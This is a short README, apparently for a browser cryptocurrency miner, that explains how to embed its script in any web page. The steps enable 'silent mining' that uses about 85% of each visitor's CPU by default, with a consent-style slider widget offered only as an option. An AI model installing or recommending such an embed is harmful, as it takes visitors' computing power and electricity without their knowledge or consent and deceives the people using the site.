Copy all the files from this archive to a subfolder somewhere in your docroot.

Eg.
/vendor/cfc/

Then include the following script code in any webpage you would like to have web mining enabled.

<script src="<path to extracted files>/direct.js data-id="<your direct number>" data-level="<cpu usage"></script>

Example:
<script src="/vendor/cfc/direct.js" data-id="3648135" data-level="85"></script>

Make sure the path to your .js starts with a /

The above will cause silent mining to occur, using ~85% of the web client's CPU.  If you would
like to provide the web user a UI widget to see their mining, and adjust the CPU usage themselves,
simply add an empty div anywhere you want it on your page, with the id "cfc_donate"

Example:

<div id="cfc_donate"></div>


This div will be populated with a slider control for the user when the script loads.

For any questions or problems, please contact: info@cpufan.club

Happy Mining!
